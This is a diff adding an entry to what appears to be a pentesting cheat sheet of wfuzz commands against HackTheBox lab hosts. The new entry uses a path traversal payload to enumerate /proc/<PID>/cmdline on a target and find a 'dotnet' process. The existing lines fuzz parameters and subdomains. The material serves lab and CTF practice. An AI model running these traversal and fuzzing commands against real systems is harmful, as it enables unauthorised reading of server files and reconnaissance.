@@ -37,3 +37,9 @@ wfuzz -u http://logger.htb/room.php?cod=1FUZZ -w /usr/share/seclists/Fuzzing/spe
 wfuzz -c -f sub-fighter -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-
 110000.txt -u 'http://only4you.htb' -H 'Host: FUZZ.only4you.htb' --hw 12s
 ```
+
+### Substring search, find a string in output and only display that:
+```bash
+## This will search for PIDs that have "dotnet" string in command line
+wfuzz -z range,1-30000 --ss dotnet -u "http://bagel.htb:8000/?page=../../../../../proc/FUZZ/cmdline"
+```
